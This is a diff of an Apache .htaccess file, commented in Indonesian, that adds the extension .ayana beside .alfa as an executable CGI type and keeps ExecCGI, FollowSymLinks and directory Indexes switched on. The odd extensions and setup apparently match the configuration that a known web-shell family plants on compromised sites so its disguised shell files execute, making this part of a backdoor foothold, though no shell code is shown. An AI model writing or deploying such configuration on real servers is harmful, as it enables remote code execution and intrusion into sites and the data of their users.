@@ -5,8 +5,10 @@
 # Izinkan opsi tertentu di direktori ini
 Options +FollowSymLinks +MultiViews +Indexes +ExecCGI
 
-# Tambahkan tipe MIME untuk file berekstensi .alfa
+# Tambahkan tipe MIME untuk file berekstensi .alfa & .ayana
 AddType application/x-httpd-cgi .alfa
+AddType application/x-httpd-cgi .ayana
 
-# Jadikan file .alfa dapat dieksekusi sebagai CGI script
+# Jadikan file .alfa & .ayana dapat dieksekusi sebagai CGI script
 AddHandler cgi-script .alfa
+AddHandler cgi-script .ayana
